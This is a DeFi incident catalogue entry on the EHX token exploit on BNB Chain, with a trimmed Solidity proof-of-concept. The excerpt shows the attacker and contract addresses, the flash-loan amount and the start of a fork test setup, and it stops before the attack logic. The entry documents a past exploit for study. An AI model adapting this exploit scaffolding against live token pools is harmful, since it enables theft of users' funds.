# [?] EHX - Lack of Slippage Control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: EHX
Published: 2023-11-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/EHX_exp.sol
Type: defi-exploit-poc

## Details
Lost: Unclear

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Unclear
// Attacker : https://bscscan.com/address/0xddaaedcf226729def824cc5c14382c5980844d1f
// Attack Contract : https://bscscan.com/address/0x9d0d28f7b9a9e6d55abb9e41a87df133f316c68c
// Vulnerable Contract : https://bscscan.com/address/0xe1747a23c44f445062078e3c528c9f4c28c50a51
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x8b528372b743b4b8c4eb0904c96529482653187c19e13afaa22f3ba4e08fbfbb

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xe1747a23c44f445062078e3c528c9f4c28c50a51#code#L1200

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1724691996638618086
// Hacking God :

contract EHXExploit is Test {
    DVM private constant DPPOracle = DVM(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 private constant EHX_WBNB = Uni_Pair_V2(0x3407c5398256cc242a7a22c373D9F252BaB37458);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant EHX = IERC20(0xe1747a23C44f445062078e3C528c9F4c28C50a51);

    uint256 private constant blocknumToForkFrom = 33_503_911;
    // Value comes from raw data passed to function with selector '0x40b2f80f' (see attack tx)
    uint256 private constant flashAmountWBNB = 5_589_328_092_301_986_679;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(DPPOracle), "DPPOracle");
        vm.label(address(Router), "Router");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/EHX_exp.sol_
